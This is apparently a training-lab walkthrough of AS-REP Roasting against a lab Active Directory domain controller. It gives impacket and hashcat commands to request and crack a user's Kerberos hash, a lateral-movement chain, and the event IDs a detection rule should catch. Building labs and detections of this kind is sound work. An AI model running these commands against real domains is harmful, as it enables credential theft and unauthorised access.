# WT#003 — AS-REP Roasting

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc02 (192.168.77.11), child.cadre.local |
| **Domain** | child.cadre.local |
| **Starting Credential** | None (no authentication required) |
| **Tools Required** | impacket, hashcat |
| **Certifications** | CRTP, OSCP+ |
| **MITRE ATT&CK** | T1558.004 |
| **Difficulty** | Easy |

## Prerequisites

- Network access to dc02 (192.168.77.11)
- Target user `intern_blue` has `DONT_REQUIRE_PREAUTH` set

## Attack Steps

### Step 1: Recon — Identify AS-REP roastable users

```bash
echo intern_blue > users.txt
```

### Step 2: Exploit — Request AS-REP hash

```bash
impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile users.txt -outputfile asrep.txt
```

### Step 3: Verify — Crack the hash

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

## Post-Exploitation Chain

AS-REP hash (hashcat 18200) → crack → `intern_blue` plaintext password → low-privilege foothold in `child.cadre.local` → lateral movement via ForceChangePassword ACE on `analyst_t2`

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** `cadre-002-asrep-roast`
- **Expected Event:** Event ID 4768, PreAuthType:0, TargetUserName:intern_blue

## Status

CONFIGURED
